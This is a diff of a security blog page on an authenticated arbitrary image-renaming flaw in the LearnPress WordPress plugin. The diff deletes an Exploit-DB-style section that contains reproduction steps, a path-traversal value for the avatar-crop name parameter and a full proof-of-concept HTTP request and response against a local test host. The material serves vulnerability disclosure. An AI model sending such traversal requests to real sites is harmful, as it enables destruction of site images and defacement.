@@ -182,7 +182,7 @@ A user of this LMS can upload an image as a profile avatar after the registratio
         <div class="article-read-time">
           <i class="far fa-clock"></i>
           
-          4 minute read
+          2 minute read
         </div>
         
         
@@ -257,83 +257,7 @@ A user of this LMS can upload an image as a profile avatar after the registratio
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span>	<span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$new_avatar</span>;
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span>}
-</code></pre></div><h1 id="exploit-db-submission">Exploit-DB Submission</h1>
-<pre><code># Exploit Title: WordPress Plugin Learnpress &lt;= 4.1.4.1 - Arbitrary Image Renaming (Authenticated)
-# Date: 08-01-2022
-# Exploit Author: Ceylan Bozogullarindan
-# Vendor Homepage: https://thimpress.com/
-# Software Link: https://thimpress.com/learnpress-plugin/
-# Version: 4.1.4.1
-# Tested on: Linux
-# CVE:
-
-
-# Description:
-
-LearnPress is a WordPress complete solution for creating a Learning Management System (LMS). It can help you to create courses, lessons and quizzes.
-
-A user of this LMS can upload an image as a profile avatar after the registration.  After this process the user crops and saves the image. Then a &quot;POST&quot; request that contains user supplied name of the image is sent to the server for renaming and cropping of the image. As a result of this request, the name of the user-supplied image is changed with a MD5 value. This process can be conducted only when type of the image is JPG or PNG.
-
-An attacker can use this vulnerability in order to rename an arbitrary image file. By doing this, he/she can destroy the design of the web site. Some examples of the malicious actions:
-
-- Destroying of banner of a web site
-- Destroying of user avatars
-- Destroying of post images
-- Destroying of button/app images etc.
-
-# Steps To Reproduce
-
-1. Register and login to the learnpress system.
-2. Go to the profile page and upload an avatar image: https://&lt;learnpress-website&gt;/lp-profile/&lt;your-username&gt;/settings/avatar/
-3. While saving the image, intercept the POST request by a local proxy tool such as Burpsuite.
-4. Change the value of the `lp-user-avatar-crop[name]` parameter to an arbitrary image file path that is in the website (example, /2021/01/image.png or /../../image.png). The path is relative to &quot;/wp-content/uploads/&quot;.
-5. Forward the intercepted request and check the existence of the image file given in Step 4.
-6. You will see that the image can not be found. Because the name of it is renamed.
-
-# PoC - Supported Materials
-
-Request
----------------------------------------------------------------------------
-POST /lp-profile/&lt;username&gt;/settings/avatar/?lp-ajax=save-uploaded-user-avatar HTTP/1.1
-Host: 127.0.0.1:8000
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-X-Requested-With: XMLHttpRequest
-Content-Length: 242
-Origin: http://127.0.0.1:8000
-Connection: close
-Referer: http://127.0.0.1:8000/lp-profile/ceylanb/settings/avatar/
-Cookie: _learn_press_session_4411def9d576984c8d78253236b2a62f=4509d5151308952d51776226bb847241%7C%7C1641770556%7C%7C19e385a78349f37ac993a36ecda9c41f; wordpress_lp_cart=1; wordpress_logged_in_4411def9d576984c8d78253236b2a62f=ceylanb%7C1642807471%7CRKS5hU3q1b2G0xY1pkwfl43yVJdIqz9fqBLcknvbyzJ%7C98d337987ee0cbc7539a742e2ebbfbe107d1e0c910c3efd9daa51c4775236e19; LP=%7B%22course-tab%22%3A%22overview%22%7D
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-DNT: 1
-Sec-GPC: 1
-
-lp-user-avatar-crop%5Bname%5D=%2f..%2f..%2fimage.jpg&amp;lp-user-avatar-crop%5Bwidth%5D=250&amp;lp-user-avatar-crop%5Bheight%5D=250&amp;lp-user-avatar-crop%5Bpoints%5D=0%2C0%2C300%2C300&amp;lp-user-avatar-crop%5Bnonce%5D=8bdc969b07&amp;lp-user-avatar-custom=yes
----------------------------------------------------------------------------
-
-Response
----------------------------------------------------------------------------
-HTTP/1.1 200 OK
-Date: Sat, 08 Jan 2022 00:30:11 GMT
-Server: Apache/2.4.48 (Debian)
-X-Powered-By: PHP/7.4.23
-Expires: Wed, 11 Jan 1984 05:00:00 GMT
-Cache-Control: no-cache, must-revalidate, max-age=0
-Link: &lt;http://127.0.0.1:8000/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;
-Link: &lt;http://127.0.0.1:8000/wp-json/wp/v2/pages/17&gt;; rel=&quot;alternate&quot;; type=&quot;application/json&quot;
-Link: &lt;http://127.0.0.1:8000/?p=17&gt;; rel=shortlink
-Vary: Accept-Encoding
-Content-Length: 191
-Connection: close
-Content-Type: text/html; charset=UTF-8
-
-&lt;-- LP_AJAX_START --&gt;{&quot;success&quot;:true,&quot;avatar&quot;:&quot;&lt;img src=\&quot;http:\/\/127.0.0.1:8000\/wp-content\/uploads\/learn-press-profile\/2\/f574f3e6594498507333c41af9426d43.jpg\&quot; \/&gt;&quot;}&lt;-- LP_AJAX_END --&gt;
----------------------------------------------------------------------------
-</code></pre>
+</code></pre></div>
     </div>
   </article>
 
